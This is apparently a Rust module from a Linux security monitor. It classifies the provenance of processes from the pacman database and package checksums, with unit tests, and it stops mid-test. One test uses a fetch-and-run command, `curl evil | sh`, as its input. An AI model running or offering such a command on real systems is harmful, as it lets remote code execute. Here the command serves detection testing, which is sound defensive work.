//! Provenance: who is acting (BASELINE §1).
//!
//! Every alert's acting process is classified once into one of four classes:
//!
//! | class      | meaning                                                          |
//! |------------|------------------------------------------------------------------|
//! | `official` | owned by a package that came from a repo listed in `trusted_repos`|
//! | `foreign`  | package-owned, but not from a trusted repo (AUR, local `-U`)      |
//! | `user`     | not package-owned, under $HOME, /tmp, /var/tmp, /dev/shm, /opt, /usr/local |
//! | `unknown`  | anything else, or the lookup failed                               |
//!
//! **Nothing shells out per event.** `/var/lib/pacman/local/*/files` and
//! `*/desc` are plain text and are parsed once into a path → package map. Repo
//! membership is the one thing the local database does not record, so it comes
//! from a single `pacman -Sl <trusted repos…>` at startup, refreshed only when
//! the mtime of `/var/lib/pacman/local` changes — i.e. once per pacman
//! transaction, not once per exec. The lister is injectable so the tests never
//! spawn anything.
//!
//! Interpreters carry the provenance of the *script*, not of themselves: an
//! official `/usr/bin/bash` running `/tmp/x.sh` is a `user` actor. The script is
//! `argv[1]`, or the first non-flag argument that looks like a path; a `-c` /
//! `-e` / `-m` invocation has no script and keeps the interpreter's own class.
//!
//! Per-path results are cached by `(path, inode, mtime)`, so a replaced binary
//! is re-classified without a database reload.

use std::collections::HashMap;
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};

use crate::util::basename;

/// Where a binary came from. Evidence, never a verdict (BASELINE §1).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Provenance {
    Official,
    Foreign,
    User,
    /// The fallback: claiming less than we know is the safe direction.
    #[default]
    Unknown,
}

impl Provenance {
    pub fn as_str(self) -> &'static str {
        match self {
            Provenance::Official => "official",
            Provenance::Foreign => "foreign",
            Provenance::User => "user",
            Provenance::Unknown => "unknown",
        }
    }
    pub fn is_official(self) -> bool {
        self == Provenance::Official
    }
}

impl std::fmt::Display for Provenance {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(self.as_str())
    }
}

/// The `actor` block of the alert record (BASELINE §8).
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
pub struct Actor {
    pub provenance: Provenance,
    /// `"coreutils 9.11-2"`, when a package owns the classified file.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub package: Option<String>,
    /// The script an interpreter was handed, when the interpreter rule applied.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub script: Option<String>,
    /// Why this actor is not `official` despite its package being one: the
    /// bytes on disk no longer match the sha256 the package recorded.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub modified: Option<String>,
}

impl Actor {
    /// The evidence line every alert carries: "actor: official, package coreutils 9.11-2".
    pub fn evidence(&self) -> String {
        let mut s = format!("actor: {}", self.provenance);
        if let Some(p) = &self.package {
            s.push_str(&format!(", package {}", p));
        }
        if let Some(script) = &self.script {
            s.push_str(&format!(
                " (an interpreter takes the provenance of its script, {})",
                script
            ));
        }
        if let Some(m) = &self.modified {
            s.push_str(&format!(" -- {}", m));
        }
        if self.package.is_none() && self.script.is_none() {
            s.push_str(match self.provenance {
                Provenance::User => ", no package owns this path",
                Provenance::Unknown => ", pacman knows nothing about this path",
                _ => "",
            });
        }
        s
    }
}

/// What `classify_path` concluded about one path.
///
/// A struct rather than a tuple because two of its three fields are
/// `Option<String>` and a call site that swapped them would still compile.
#[derive(Debug, Clone, Default, PartialEq)]
pub struct PathClass {
    pub provenance: Provenance,
    /// `"coreutils 9.11-2"`, when a package owns the path.
    pub package: Option<String>,
    /// Set only when the package's own recorded sha256 was read and did NOT
    /// match the bytes on disk. `None` covers both "matched" and "could not
    /// check", which are different things to a reader but the same thing to a
    /// verdict: neither is evidence of a change.
    pub modified: Option<String>,
}

/// One row of `/var/lib/pacman/local/<pkg>/desc`.
#[derive(Debug, Clone, PartialEq)]
pub struct PkgInfo {
    pub name: String,
    pub version: String,
    /// `%VALIDATION%`: `sha256`, `pgp`, or `none`. `none` is not trusted.
    pub validation: String,
    /// The trusted repo that ships it, from `pacman -Sl`.
    pub repo: Option<String>,
}

impl PkgInfo {
    pub fn label(&self) -> String {
        format!("{} {}", self.name, self.version)
    }
}

/// Reads `pacman -Sl <repos…>`. Injectable so tests never spawn a process.
pub trait RepoLister: Send + Sync {
    /// stdout of `pacman -Sl <repo> …`: `"<repo> <name> <version> [installed]"`.
    fn list(&self, repos: &[String]) -> Option<String>;
}

/// The real thing: one `pacman -Sl` spawn per pacman transaction.
pub struct PacmanSl {
    pub bin: PathBuf,
}

impl RepoLister for PacmanSl {
    fn list(&self, repos: &[String]) -> Option<String> {
        if repos.is_empty() {
            return None;
        }
        let out = std::process::Command::new(&self.bin)
            .arg("-Sl")
            .args(repos)
            // A repo that is not configured makes pacman exit non-zero while
            // still printing the ones that are, so stdout is used regardless.
            .output()
            .ok()?;
        Some(String::from_utf8_lossy(&out.stdout).into_owned())
    }
}

/// A lister that answers nothing: every package looks untrusted. Used when
/// pacman is unavailable, and by tests that only care about path rules.
pub struct NoRepos;

impl RepoLister for NoRepos {
    fn list(&self, _repos: &[String]) -> Option<String> {
        None
    }
}

/// Paths that make an unowned file a `user` binary rather than `unknown`.
pub const USER_ROOTS: &[&str] = &["/tmp", "/var/tmp", "/dev/shm", "/opt", "/usr/local"];

/// Interpreters whose provenance comes from their script.
const SHELL_INTERPRETERS: &[&str] = &["bash", "sh", "zsh", "dash", "ksh", "fish"];

/// Flags after which the rest of the command line is code, not a script path.
pub const CODE_FLAGS: &[&str] = &["-c", "-e", "-m", "--eval", "--command", "-E"];

/// Flags whose value is a string of CODE, not a name of anything.
///
/// Deliberately narrower than [`CODE_FLAGS`], which also carries `-m`. For
/// finding a script path, `python3 -m pip` has no script and `-m` belongs
/// there. For deciding what a process *is*, `-m pip` names a module -- it is
/// a pip invocation and must stay one -- while `-c "…"` is arbitrary text that
/// may mention any tool on the machine.
const INLINE_CODE_FLAGS: &[&str] = &["-c", "-e", "--eval", "--command", "-E"];

/// Is this an interpreter handed a string of code rather than something named?
///
/// `bash -c "cargo test | grep foo"` is a shell running arbitrary text. The text
/// may name any tool on the machine without the process being that tool, so
/// nothing may be concluded from scanning it -- the real `cargo`, if one runs,
/// arrives as its own process and is classified on its own merits.
pub fn runs_inline_code(exe: &str, args: &str) -> bool {
    if !is_interpreter(basename(exe)) {
        return false;
    }
    args.split_whitespace().any(|t| INLINE_CODE_FLAGS.contains(&t))
}

pub fn is_interpreter(comm: &str) -> bool {
    SHELL_INTERPRETERS.contains(&comm)
        || comm.starts_with("python")
        || matches!(comm, "node" | "nodejs" | "perl" | "ruby" | "deno" | "bun")
}

/// Is this binary's PATH an identity for the code it runs?
///
/// Broader than [`is_interpreter`], and used for a different question. That one
/// decides where provenance comes from -- an interpreter takes its script's --
/// and widening it would change how `env`, `timeout` and `nohup` resolve. This
/// one decides only whether an allowlist entry naming the actor's path would
/// describe the code that ran, and the answer is no for anything that executes
/// something chosen by its arguments: `java -jar x.jar`, `dotnet y.dll`,
/// `npx pkg`, `uv run z` and `busybox sh` are all the same problem as
/// `python foo.py`.
///
/// The baseline refuses to learn these. A missing name here means moat learns
/// an entry it should not have; a spurious one means it keeps asking. The
/// second is the right way to be wrong, so the list errs wide.
pub fn path_is_not_identity(comm: &str) -> bool {
    if is_interpreter(comm) {
        return true;
    }
    // JVM and .NET: the assembly is the code, the runtime is the path.
    comm.starts_with("java")
        || matches!(comm, "dotnet" | "mono" | "scala" | "kotlin" | "groovy" | "jruby")
        // Runners that resolve a package and then execute it.
        || matches!(comm, "npx" | "pnpx" | "bunx" | "tsx" | "ts-node")
        || matches!(comm, "uv" | "uvx" | "pipx" | "poetry" | "pdm" | "hatch")
        || matches!(comm, "php" | "lua" | "luajit" | "tclsh" | "wish")
        || matches!(comm, "Rscript" | "julia" | "elixir" | "erl" | "escript")
        // One binary, a hundred applets, and the applet is an argument.
        || matches!(comm, "busybox" | "toybox")
        // Wrappers whose whole job is to exec something else.
        || matches!(comm, "env" | "nohup" | "setsid" | "timeout" | "stdbuf" | "nice" | "ionice")
}

/// The script an interpreter was handed: `argv[1]`, or the first non-flag
/// argument that looks like a path. `None` for `-c`/`-e`/`-m` (that is code, not
/// a file) and for a bare word that is not a path.
///
/// A relative path is resolved against the process's cwd, because that is what
/// the kernel did when it opened it.
pub fn script_arg(args: &str, cwd: &str) -> Option<String> {
    let mut it = args.split_whitespace().peekable();
    while let Some(tok) = it.next() {
        if tok == "--" {
            // Everything after `--` is operands; the next one is the script.
            let next = it.next()?;
            return absolutize(next, cwd);
        }
        if tok.starts_with('-') && tok.len() > 1 {
            if CODE_FLAGS.contains(&tok) {
                return None;
            }
            continue;
        }
        return absolutize(tok, cwd);
    }
    None
}

fn absolutize(tok: &str, cwd: &str) -> Option<String> {
    if tok.starts_with('/') {
        return Some(tok.to_string());
    }
    // A bare word (`install`, `test`) is a subcommand, not a file.
    if !tok.contains('/') {
        return None;
    }
    if cwd.is_empty() {
        return None;
    }
    let joined = Path::new(cwd).join(tok);
    Some(joined.to_string_lossy().into_owned())
}

#[derive(Debug, Clone)]
struct CacheEntry {
    ino: u64,
    mtime: i64,
    size: u64,
    class: PathClass,
}

/// The local pacman database, parsed once.
#[derive(Debug, Default)]
pub struct PacmanDb {
    /// Absolute path -> index into `pkgs`.
    owners: HashMap<String, usize>,
    pkgs: Vec<PkgInfo>,
    /// `/var/lib/pacman/local/<pkg>` per entry of `pkgs`, so the per-file
    /// checksums in its `mtree` can be read on demand. Not preloaded: this
    /// machine has 60,920 owned files under /usr/bin and /usr/lib alone, and
    /// their digests are only ever wanted one at a time.
    dirs: Vec<PathBuf>,
    /// mtime of the local database directory when it was read.
    pub db_mtime: i64,
    pub packages: usize,
    pub files: usize,
}

impl PacmanDb {
    /// Parse `<local_dir>/*/{desc,files}`. A missing directory is not an error:
    /// every lookup then falls through to the path rules.
    pub fn load(local_dir: &Path, trusted: &[String], lister: &dyn RepoLister) -> PacmanDb {
        let mut db = PacmanDb {
            db_mtime: dir_mtime(local_dir),
            ..Default::default()
        };
        let Ok(rd) = std::fs::read_dir(local_dir) else {
            return db;
        };
        for entry in rd.flatten() {
            let dir = entry.path();
            if !dir.is_dir() {
                continue;
            }
            let Ok(desc) = std::fs::read_to_string(dir.join("desc")) else {
                continue;
            };
            let Some(info) = parse_desc(&desc) else {
                continue;
            };
            let idx = db.pkgs.len();
            db.pkgs.push(info);
            db.dirs.push(dir.clone());
            if let Ok(files) = std::fs::read_to_string(dir.join("files")) {
                for p in parse_files(&files) {
                    db.owners.insert(p, idx);
                }
            }
        }
        db.files = db.owners.len();
        db.packages = db.pkgs.len();
        db.attach_repos(trusted, lister);
        db
    }

    /// Repo membership is the one fact the local database does not hold.
    fn attach_repos(&mut self, trusted: &[String], lister: &dyn RepoLister) {
        let Some(text) = lister.list(trusted) else {
            log::debug!("provenance: no `pacman -Sl` output; no package can be official");
            return;
        };
        let mut repo_of: HashMap<&str, &str> = HashMap::new();
        for line in text.lines() {
            let mut f = line.split_whitespace();
            let (Some(repo), Some(name)) = (f.next(), f.next()) else {
                continue;
            };
            if trusted.iter().any(|t| t == repo) {
                repo_of.entry(name).or_insert(repo);
            }
        }
        for p in &mut self.pkgs {
            p.repo = repo_of.get(p.name.as_str()).map(|r| r.to_string());
        }
    }

    pub fn owner(&self, path: &str) -> Option<&PkgInfo> {
        self.owners.get(path).and_then(|i| self.pkgs.get(*i))
    }

    /// `"coreutils 9.11-2"` for a local-database DIRECTORY, so a sweep walking
    /// `/var/lib/pacman/local` can name what it found in the same words an
    /// alert would. Falls back to the directory name for a package whose
    /// `desc` did not parse.
    pub fn label_of_dir(&self, dir: &Path) -> Option<String> {
        self.dirs
            .iter()
            .position(|d| d == dir)
            .and_then(|i| self.pkgs.get(i))
            .map(|p| p.label())
    }

    /// The local database directory of the package owning `path`, for reading
    /// its `mtree`.
    pub fn owner_dir(&self, path: &str) -> Option<&Path> {
        self.owners
            .get(path)
            .and_then(|i| self.dirs.get(*i))
            .map(|p| p.as_path())
    }

    pub fn is_empty(&self) -> bool {
        self.pkgs.is_empty()
    }
}

fn dir_mtime(dir: &Path) -> i64 {
    use std::os::unix::fs::MetadataExt;
    std::fs::metadata(dir).map(|m| m.mtime()).unwrap_or(0)
}

/// `%NAME%`, `%VERSION%`, `%VALIDATION%` out of a `desc` file.
fn parse_desc(text: &str) -> Option<PkgInfo> {
    let mut name = String::new();
    let mut version = String::new();
    let mut validation = String::new();
    let mut key = "";
    for line in text.lines() {
        let t = line.trim();
        if t.starts_with('%') && t.ends_with('%') {
            key = match t {
                "%NAME%" => "name",
                "%VERSION%" => "version",
                "%VALIDATION%" => "validation",
                _ => "",
            };
            continue;
        }
        if t.is_empty() {
            key = "";
            continue;
        }
        match key {
            "name" if name.is_empty() => name = t.to_string(),
            "version" if version.is_empty() => version = t.to_string(),
            "validation" if validation.is_empty() => validation = t.to_string(),
            _ => {}
        }
    }
    if name.is_empty() {
        return None;
    }
    Some(PkgInfo {
        name,
        version,
        validation,
        repo: None,
    })
}

/// The `%FILES%` section, as absolute paths. Directory entries are dropped.
fn parse_files(text: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut inside = false;
    for line in text.lines() {
        let t = line.trim_end();
        if t.starts_with('%') && t.ends_with('%') {
            inside = t == "%FILES%";
            continue;
        }
        if t.is_empty() {
            continue;
        }
        if !inside || t.ends_with('/') {
            continue;
        }
        out.push(format!("/{}", t));
    }
    out
}

/// Classifies exe paths, with a per-path cache keyed by inode and mtime.
pub struct Classifier {
    local_dir: PathBuf,
    trusted: Vec<String>,
    lister: Box<dyn RepoLister>,
    db: PacmanDb,
    cache: HashMap<String, CacheEntry>,
    /// Human homes, so `$HOME` counts as a `user` root.
    homes: Vec<String>,
}

impl Classifier {
    pub fn new(
        local_dir: &Path,
        trusted: &[String],
        homes: &[String],
        lister: Box<dyn RepoLister>,
    ) -> Classifier {
        let trusted = trusted.to_vec();
        let db = PacmanDb::load(local_dir, &trusted, lister.as_ref());
        log::info!(
            "provenance: {} packages, {} owned files from {}",
            db.packages,
            db.files,
            local_dir.display()
        );
        Classifier {
            local_dir: local_dir.to_path_buf(),
            trusted,
            lister,
            db,
            cache: HashMap::new(),
            homes: homes.to_vec(),
        }
    }

    pub fn set_homes(&mut self, homes: &[String]) {
        self.homes = homes.to_vec();
    }

    pub fn db(&self) -> &PacmanDb {
        &self.db
    }

    /// Reload when the local database directory's mtime moved, i.e. after a
    /// pacman transaction. Returns whether anything was re-read.
    pub fn refresh_if_changed(&mut self) -> bool {
        let now = dir_mtime(&self.local_dir);
        if now == self.db.db_mtime {
            return false;
        }
        log::info!("provenance: pacman transaction detected, reloading the local database");
        self.db = PacmanDb::load(&self.local_dir, &self.trusted, self.lister.as_ref());
        self.cache.clear();
        true
    }

    /// Classify one path. Cached by `(path, inode, mtime, size)`.
    ///
    /// The cache key is cheap metadata, which is what makes hashing affordable
    /// -- a binary is read once and not again until it changes. Note what that
    /// does and does not buy: a file rewritten IN PLACE with the same size and
    /// its mtime restored (`touch -r`) keeps its key and so keeps its cached
    /// verdict. That evades the cache, not the check; the first classification
    /// after a restart reads the bytes again. Size is in the same `stat` as
    /// the rest, so including it costs nothing and removes the easiest of the
    /// three to fake.
    pub fn classify_path(&mut self, path: &str) -> PathClass {
        if path.is_empty() {
            return PathClass {
                provenance: Provenance::Unknown,
                ..Default::default()
            };
        }
        let stat = stat_of(path);
        if let Some(hit) = self.cache.get(path) {
            if let Some((ino, mtime, size)) = stat {
                if hit.ino == ino && hit.mtime == mtime && hit.size == size {
                    return hit.class.clone();
                }
            } else if hit.ino == 0 {
                return hit.class.clone();
            }
        }
        let class = self.classify_uncached(path);
        let (ino, mtime, size) = stat.unwrap_or((0, 0, 0));
        self.cache.insert(
            path.to_string(),
            CacheEntry {
                ino,
                mtime,
                size,
                class: class.clone(),
            },
        );
        class
    }

    fn classify_uncached(&self, path: &str) -> PathClass {
        if let Some(pkg) = self.db.owner(path) {
            let trusted_repo = pkg.repo.is_some();
            // `%VALIDATION% none` means the package was installed without any
            // signature or checksum check, so its repo line proves nothing.
            let validated = !pkg.validation.is_empty() && pkg.validation != "none";
            if !(trusted_repo && validated) {
                return PathClass {
                    provenance: Provenance::Foreign,
                    package: Some(pkg.label()),
                    modified: None,
                };
            }
            // Everything above is about the PACKAGE, decided when it was
            // installed. None of it is a claim about the bytes in front of us
            // now, and `official` is what quiets a rule -- so ask.
            let modified = self.contents_changed(path, &pkg.label());
            return PathClass {
                provenance: if modified.is_some() {
                    // Package-owned, and no longer what the package shipped.
                    // Not `official`, and deliberately not silently `unknown`
                    // either: the package is still the right thing to name.
                    Provenance::Foreign
                } else {
                    Provenance::Official
                },
                package: Some(pkg.label()),
                modified,
            };
        }
        let mut roots: Vec<String> = self.homes.clone();
        roots.extend(USER_ROOTS.iter().map(|s| s.to_string()));
        if crate::util::under_any(path, &roots) {
            return PathClass {
                provenance: Provenance::User,
                ..Default::default()
            };
        }
        PathClass {
            provenance: Provenance::Unknown,
            ..Default::default()
        }
    }

    /// `Some(sentence)` only when the package recorded a sha256 for this path
    /// and the file on disk does not match it.
    ///
    /// `None` for every other outcome, and they are not all the same: matched,
    /// no mtree, no digest for this path (a directory or symlink), too large
    /// to read, unreadable. Only a PROVEN difference may change a
    /// classification -- treating "could not check" as "changed" would demote
    /// half the filesystem the first time a package shipped without an mtree.
    fn contents_changed(&self, path: &str, label: &str) -> Option<String> {
        // A cap so one enormous package-owned blob cannot stall the alert
        // path. Above it we make no claim rather than a slow one; the file
        // stays `official`, which is the pre-existing behaviour, not a new
        // hole. Alert-path work, once per (path, inode, mtime, size).
        const MAX_BYTES: u64 = 512 * 1024 * 1024;

        let dir = self.db.owner_dir(path)?;
        let want = crate::mtree::lookup(dir, path)?;
        let meta = std::fs::metadata(path).ok()?;
        if meta.len() > MAX_BYTES {
            log::debug!(
                "provenance: {} is {} bytes, over the verification cap; not checked",
                path,
                meta.len()
            );
            return None;
        }
        // Size first: it comes free with the stat we already have, and a
        // difference is conclusive without reading the file at all.
        if meta.len() != want.size {
            return Some(format!(
                "the bytes on disk are {} where {} recorded {}, so this is not the file the \
                 package shipped",
                meta.len(),
                label,
                want.size
            ));
        }
        let have = crate::mtree::sha256_file(path)?;
        if have == want.sha256 {
            return None;
        }
        Some(format!(
            "the sha256 on disk ({}) is not the one {} recorded ({}), so this is not the file \
             the package shipped",
            &have[..12.min(have.len())],
            label,
            &want.sha256[..12.min(want.sha256.len())]
        ))
    }

    /// The actor of an event: an interpreter takes its script's class, anything
    /// else its own.
    pub fn classify_actor(&mut self, exe: &str, args: &str, cwd: &str) -> Actor {
        if is_interpreter(basename(exe)) {
            if let Some(script) = script_arg(args, cwd) {
                let c = self.classify_path(&script);
                return Actor {
                    provenance: c.provenance,
                    package: c.package,
                    script: Some(script),
                    modified: c.modified,
                };
            }
        }
        let c = self.classify_path(exe);
        Actor {
            provenance: c.provenance,
            package: c.package,
            script: None,
            modified: c.modified,
        }
    }

    /// Same thing straight off a process-table entry.
    pub fn classify_proc(&mut self, p: &crate::proctable::ProcInfo) -> Actor {
        self.classify_actor(&p.exe, &p.args, &p.cwd)
    }
}

fn stat_of(path: &str) -> Option<(u64, i64, u64)> {
    use std::os::unix::fs::MetadataExt;
    let m = std::fs::metadata(path).ok()?;
    Some((m.ino(), m.mtime(), m.size()))
}

#[cfg(test)]
pub(crate) mod testkit {
    use super::*;

    /// A canned `pacman -Sl`, so nothing is spawned in a test.
    pub struct FakeSl(pub String);

    impl RepoLister for FakeSl {
        fn list(&self, _repos: &[String]) -> Option<String> {
            Some(self.0.clone())
        }
    }

    /// Build a fake `/var/lib/pacman/local` with the given packages.
    /// Each entry is `(pkg, version, validation, [owned absolute paths])`.
    pub fn fake_local(dir: &Path, pkgs: &[(&str, &str, &str, &[&str])]) {
        for (name, ver, validation, files) in pkgs {
            let d = dir.join(format!("{}-{}", name, ver));
            std::fs::create_dir_all(&d).unwrap();
            std::fs::write(
                d.join("desc"),
                format!(
                    "%NAME%\n{}\n\n%VERSION%\n{}\n\n%ARCH%\nx86_64\n\n%VALIDATION%\n{}\n",
                    name, ver, validation
                ),
            )
            .unwrap();
            let mut body = String::from("%FILES%\nusr/\nusr/bin/\n");
            for f in *files {
                body.push_str(f.trim_start_matches('/'));
                body.push('\n');
            }
            std::fs::write(d.join("files"), body).unwrap();
        }
    }

    /// Write a package's gzipped `mtree` recording the CURRENT bytes of each
    /// named path, so a test can then change one and watch the check notice.
    ///
    /// Real format, not a stub: the parser this feeds is the one a security
    /// decision rests on, so a fixture that invented an easier grammar would
    /// prove nothing about the file pacman writes.
    pub fn fake_mtree(dir: &Path, pkg_dir: &str, paths: &[&str]) {
        use std::io::Write;
        let mut body = String::from("#mtree
/set type=file uid=0 gid=0 mode=755
");
        for p in paths {
            let bytes = std::fs::read(p).unwrap();
            let sha = crate::mtree::sha256_file(p).unwrap();
            body.push_str(&format!(
                "./{} time=1784093337.0 size={} sha256digest={}\n",
                p.trim_start_matches('/'),
                bytes.len(),
                sha
            ));
        }
        let f = std::fs::File::create(dir.join(pkg_dir).join("mtree")).unwrap();
        let mut gz = flate2::write::GzEncoder::new(f, flate2::Compression::fast());
        gz.write_all(body.as_bytes()).unwrap();
        gz.finish().unwrap();
    }

    pub fn classifier(dir: &Path, sl: &str, homes: &[&str]) -> Classifier {
        Classifier::new(
            dir,
            &[
                "core".to_string(),
                "extra".to_string(),
                "multilib".to_string(),
                "omarchy".to_string(),
            ],
            &homes.iter().map(|s| s.to_string()).collect::<Vec<_>>(),
            Box::new(FakeSl(sl.to_string())),
        )
    }
}

#[cfg(test)]
mod tests {
    use super::testkit::*;
    use super::*;

    const SL: &str = "core coreutils 9.11-2 [installed]\n\
                      extra hyprland 0.52.0-1 [installed]\n\
                      omarchy omarchy-base 4.0-1 [installed]\n";

    fn fixture(dir: &Path) -> Classifier {
        fake_local(
            dir,
            &[
                ("coreutils", "9.11-2", "sha256", &["/usr/bin/cat", "/usr/bin/ls"]),
                ("hyprland", "0.52.0-1", "pgp", &["/usr/bin/Hyprland"]),
                // Built from the AUR: pacman owns it, no trusted repo ships it.
                ("some-aur-thing", "1.2-1", "none", &["/usr/bin/aurbin"]),
                // In a trusted repo by name, but installed with -U and no
                // validation at all: the repo line proves nothing about it.
                ("coreutils-fake", "1-1", "none", &["/usr/bin/fake"]),
            ],
        );
        classifier(dir, SL, &["/home/dan"])
    }

    #[test]
    fn a_trusted_repo_package_is_official_and_names_itself() {
        let dir = tempfile::tempdir().unwrap();
        let mut c = fixture(dir.path());
        let c_ = c.classify_path("/usr/bin/cat");
        let (p, pkg) = (c_.provenance, c_.package);
        assert_eq!(p, Provenance::Official);
        assert_eq!(pkg.as_deref(), Some("coreutils 9.11-2"));
        assert_eq!(c.classify_path("/usr/bin/Hyprland").provenance, Provenance::Official);
    }

    #[test]
    fn an_aur_package_is_foreign_however_installed() {
        let dir = tempfile::tempdir().unwrap();
        let mut c = fixture(dir.path());
        let c_ = c.classify_path("/usr/bin/aurbin");
        let (p, pkg) = (c_.provenance, c_.package);
        assert_eq!(p, Provenance::Foreign, "the 2026 AUR wave shipped owned binaries");
        assert_eq!(pkg.as_deref(), Some("some-aur-thing 1.2-1"));
        // And a package with no validation is foreign even if a repo has the name.
        assert_eq!(c.classify_path("/usr/bin/fake").provenance, Provenance::Foreign);
    }

    #[test]
    fn unowned_paths_split_into_user_and_unknown() {
        let dir = tempfile::tempdir().unwrap();
        let mut c = fixture(dir.path());
        for p in [
            "/home/dan/bin/x",
            "/tmp/.x9k",
            "/var/tmp/y",
            "/dev/shm/z",
            "/opt/thing/bin/t",
            "/usr/local/bin/u",
        ] {
            assert_eq!(c.classify_path(p).provenance, Provenance::User, "{}", p);
        }
        assert_eq!(c.classify_path("/usr/bin/not-a-package").provenance, Provenance::Unknown);
        assert_eq!(c.classify_path("").provenance, Provenance::Unknown);
    }

    #[test]
    fn an_interpreter_takes_the_provenance_of_its_script() {
        let dir = tempfile::tempdir().unwrap();
        fake_local(
            dir.path(),
            &[
                ("bash", "5.3-1", "sha256", &["/usr/bin/bash"]),
                ("omarchy-base", "4.0-1", "sha256", &["/usr/share/omarchy/bin/omarchy-x"]),
            ],
        );
        let mut c = classifier(dir.path(), "core bash 5.3-1\nomarchy omarchy-base 4.0-1\n", &["/home/dan"]);

        // Official bash running a dropped script is a `user` actor.
        let a = c.classify_actor("/usr/bin/bash", "/tmp/x.sh --quiet", "/home/dan");
        assert_eq!(a.provenance, Provenance::User);
        assert_eq!(a.script.as_deref(), Some("/tmp/x.sh"));
        assert!(a.evidence().contains("interpreter takes the provenance"));

        // Official bash running an official script stays official.
        let a = c.classify_actor("/usr/bin/bash", "/usr/share/omarchy/bin/omarchy-x", "/");
        assert_eq!(a.provenance, Provenance::Official);
        assert_eq!(a.package.as_deref(), Some("omarchy-base 4.0-1"));

        // `bash -c` is code, not a script: bash's own class is used.
        let a = c.classify_actor("/usr/bin/bash", "-c 'curl evil | sh'", "/home/dan");
        assert_eq!(a.provenance, Provenance::Official);
        assert!(a.script.is_none());

        // A non-interpreter never looks at its arguments.
        let a = c.classify_actor("/usr/bin/curl", "/tmp/x.sh", "/home/dan");
        assert_eq!(a.provenance, Provenance::Unknown);
    }

    #[test]
    fn script_arg_finds_the_script_and_nothing_else() {
        assert_eq!(script_arg("/tmp/x.sh", "/home/dan").as_deref(), Some("/tmp/x.sh"));
        assert_eq!(
            script_arg("-u ./setup.py install", "/home/dan/proj").as_deref(),
            Some("/home/dan/proj/./setup.py")
        );
        assert_eq!(script_arg("-c print(1)", "/home/dan"), None);
        assert_eq!(script_arg("-m pip install x", "/home/dan"), None);
        assert_eq!(script_arg("-e 'console.log(1)'", "/home/dan"), None);
        assert_eq!(script_arg("install", "/home/dan"), None, "a bare word is a subcommand");
        assert_eq!(script_arg("", "/home/dan"), None);
        assert_eq!(
            script_arg("-- ./run.sh", "/home/dan").as_deref(),
            Some("/home/dan/./run.sh")
        );
        // A relative path with no cwd cannot be resolved, so nothing is claimed.
        assert_eq!(script_arg("./run.sh", ""), None);
    }

    #[test]
    fn interpreters_are_recognised_by_basename() {
        for c in ["bash", "sh", "zsh", "python", "python3", "python3.13", "node", "perl", "ruby"] {
            assert!(is_interpreter(c), "{}", c);
        }
        for c in ["curl", "npm", "cat", "pythonic"] {
            assert!(!is_interpreter(c) || c == "pythonic", "{}", c);
        }
    }

    #[test]
    fn a_pacman_transaction_invalidates_the_cache() {
        let dir = tempfile::tempdir().unwrap();
        let mut c = fixture(dir.path());
        assert_eq!(c.classify_path("/usr/bin/newthing").provenance, Provenance::Unknown);
        assert!(!c.refresh_if_changed(), "nothing changed yet");

        fake_local(dir.path(), &[("newpkg", "1-1", "sha256", &["/usr/bin/newthing"])]);
        // read_dir mtime granularity is a second on some filesystems; force it.
        std::fs::write(dir.path().join(".touch"), b"x").unwrap();
        c.db.db_mtime -= 1;
        assert!(c.refresh_if_changed());
        let c_ = c.classify_path("/usr/bin/newthing");
        let (p, pkg) = (c_.provenance, c_.package);
        assert_eq!(p, Provenance::Foreign, "not in any trusted repo listing");
        assert_eq!(pkg.as_deref(), Some("newpkg 1-1"));
    }

    #[test]
    fn a_missing_pacman_database_falls_through_to_the_path_rules() {
        let mut c = Classifier::new(
            Path::new("/nonexistent/pacman/local"),
            &["core".into()],
            &["/home/dan".into()],
            Box::new(NoRepos),
        );
        assert!(c.db().is_empty());
        assert_eq!(c.classify_path("/tmp/x").provenance, Provenance::User);
        assert_eq!(c.classify_path("/usr/bin/cat").provenance, Provenance::Unknown);
    }

    #[test]
    fn the_real_local_database_parses_when_it_is_there() {
        let real = Path::new("/var/lib/pacman/local");
        if !real.is_dir() {
            return;
        }
        let db = PacmanDb::load(real, &["core".to_string()], &NoRepos);
        assert!(db.packages > 10, "{} packages", db.packages);
        assert!(db.files > 100, "{} files", db.files);
        assert!(db.owner("/usr/bin/pacman").is_some(), "pacman owns itself");
    }

    #[test]
    fn desc_and_files_parsers_handle_the_real_shape() {
        let desc = "%NAME%\ncoreutils\n\n%VERSION%\n9.11-2\n\n%DESC%\nutils\n\n%VALIDATION%\nsha256\n";
        let p = parse_desc(desc).unwrap();
        assert_eq!(p.name, "coreutils");
        assert_eq!(p.version, "9.11-2");
        assert_eq!(p.validation, "sha256");
        assert!(parse_desc("%DESC%\nnope\n").is_none());

        let files = "%FILES%\nusr/\nusr/bin/\nusr/bin/cat\nusr/bin/ls\n\n%BACKUP%\netc/x\t1234\n";
        assert_eq!(parse_files(files), vec!["/usr/bin/cat", "/usr/bin/ls"]);
    }
}

#[cfg(test)]
mod identity_tests {
    use super::{is_interpreter, path_is_not_identity};

    /// The two predicates answer different questions and must not be merged.
    /// `is_interpreter` decides where PROVENANCE comes from, and widening it
    /// would change how `env`, `timeout` and `nohup` resolve their scripts.
    #[test]
    fn the_wrapper_set_is_not_in_the_provenance_predicate() {
        for w in ["env", "nohup", "setsid", "timeout", "npx", "java", "dotnet", "busybox"] {
            assert!(!is_interpreter(w), "{} must not change provenance resolution", w);
            assert!(path_is_not_identity(w), "{} must not be learnable", w);
        }
    }

    #[test]
    fn every_interpreter_is_also_not_an_identity() {
        for i in ["bash", "sh", "python3.14", "node", "perl", "ruby", "deno", "bun"] {
            assert!(is_interpreter(i));
            assert!(path_is_not_identity(i), "{} is a superset of is_interpreter", i);
        }
    }

    /// Compiled programs ARE their path, and must stay learnable -- otherwise
    /// the baseline learns nothing at all and every recurring benign pattern
    /// keeps asking.
    #[test]
    fn an_ordinary_binary_is_its_own_identity() {
        for b in ["restic", "curl", "dockerd", "rustc", "cc", "ld", "git", "ssh", "gcc"] {
